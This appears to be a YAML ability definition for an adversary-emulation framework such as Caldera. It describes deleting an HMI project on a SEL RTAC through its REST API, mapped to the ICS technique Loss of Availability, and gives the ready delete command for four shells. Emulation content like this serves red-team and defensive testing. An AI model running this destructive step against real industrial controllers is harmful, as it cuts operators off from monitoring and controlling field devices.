- id: f3a1c9e7-2b4d-4081-8e5a-6c3f2d9b7e04
  name: RTAC HMI - Delete Project
  description: >
    Deletes a named HMI project from the SEL RTAC via
    DELETE /api/v1/hmi/projects/{HMIProjectName}. Removes the operator display
    configuration, stripping operators of their process visualization interface
    and preventing monitoring or control of connected field devices through
    the HMI.
  tactic: inhibit-response-function
  technique_id: T0826
  technique_name: Loss of Availability
  executors:
  - platform: linux
    name: sh
    command: >
      python3 ./rtac_hmi.py --base-url #{rtac.hmi.base_url}
      --token #{rtac.hmi.token} --insecure
      delete-project #{rtac.hmi.project_name}
    payloads:
    - rtac_hmi.py
    timeout: 60
  - platform: darwin
    name: sh
    command: >
      python3 ./rtac_hmi.py --base-url #{rtac.hmi.base_url}
      --token #{rtac.hmi.token} --insecure
      delete-project #{rtac.hmi.project_name}
    payloads:
    - rtac_hmi.py
    timeout: 60
  - platform: windows
    name: psh
    command: >
      python ./rtac_hmi.py --base-url #{rtac.hmi.base_url}
      --token #{rtac.hmi.token} --insecure
      delete-project #{rtac.hmi.project_name}
    payloads:
    - rtac_hmi.py
    timeout: 60
  - platform: windows
    name: cmd
    command: >
      python ./rtac_hmi.py --base-url #{rtac.hmi.base_url}
      --token #{rtac.hmi.token} --insecure
      delete-project #{rtac.hmi.project_name}
    payloads:
    - rtac_hmi.py
    timeout: 60
  repeatable: false
  plugin: dnp3
